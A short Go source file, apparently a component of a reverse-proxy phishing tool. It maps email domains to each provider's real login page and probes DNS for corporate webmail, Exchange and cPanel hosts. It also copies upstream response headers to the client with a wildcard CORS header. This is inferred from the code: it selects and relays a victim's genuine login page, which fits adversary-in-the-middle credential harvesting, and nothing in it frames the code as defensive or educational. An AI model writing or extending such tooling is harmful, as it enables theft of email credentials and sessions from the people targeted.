package main

import (
	"fmt"
	"net"
	"net/http"
	"strings"
)

// ProviderMapping maps email domains to their primary login URLs.
var ProviderMapping = map[string]string{
	// US Providers
	"gmail.com":      "https://accounts.google.com/",
	"googlemail.com": "https://accounts.google.com/",
	"outlook.com":    "https://login.microsoftonline.com/", // Fixed: Was login.live.com
	"hotmail.com":    "https://login.microsoftonline.com/", // Fixed: Was login.live.com
	"live.com":       "https://login.microsoftonline.com/", // Fixed: Was login.live.com
	"msn.com":        "https://login.microsoftonline.com/", // Fixed: Was login.live.com
	"yahoo.com":      "https://login.yahoo.com/",
	"ymail.com":      "https://login.yahoo.com/",
	"icloud.com":     "https://appleid.apple.com/",
	"me.com":         "https://appleid.apple.com/",
	"aol.com":        "https://login.aol.com/",
	"protonmail.com": "https://account.proton.me/",
	"proton.me":      "https://account.proton.me/",
	"zoho.com":       "https://accounts.zoho.com/",

	// China Providers
	"qq.com":       "https://mail.qq.com/",
	"foxmail.com":  "https://mail.qq.com/",
	"163.com":      "https://mail.163.com/",
	"126.com":      "https://mail.126.com/",
	"yeah.net":     "https://mail.yeah.net/",
	"sina.com":     "https://mail.sina.com.cn/",
	"sohu.com":     "https://mail.sohu.com/",
	"qiye.163.com": "https://qiye.163.com/",
}

// GetTargetDomain determines the login page based on the email domain.
func GetTargetDomain(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) < 2 {
		return "https://accounts.google.com/"
	}
	domain := strings.ToLower(parts[1])

	// 1. Check the known map first
	if target, ok := ProviderMapping[domain]; ok {
		return target
	}

	// 2. Smart DNS Fallback for custom corporate domains
	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover", "portal", "cpanel", "roundcube"}
	for _, sub := range subdomains {
		fullDomain := sub + "." + domain
		_, err := net.LookupHost(fullDomain)
		if err == nil {
			return fmt.Sprintf("https://%s/", fullDomain)
		}
	}

	// 3. Absolute Fallback
	return fmt.Sprintf("https://%s/", domain)
}

// CloneHeaders copies critical headers from the upstream response to the client
func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
	if ct := src.Header.Get("Content-Type"); ct != "" {
		dst.Header().Set("Content-Type", ct)
	}
	dst.Header().Set("Access-Control-Allow-Origin", "*")
	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
}
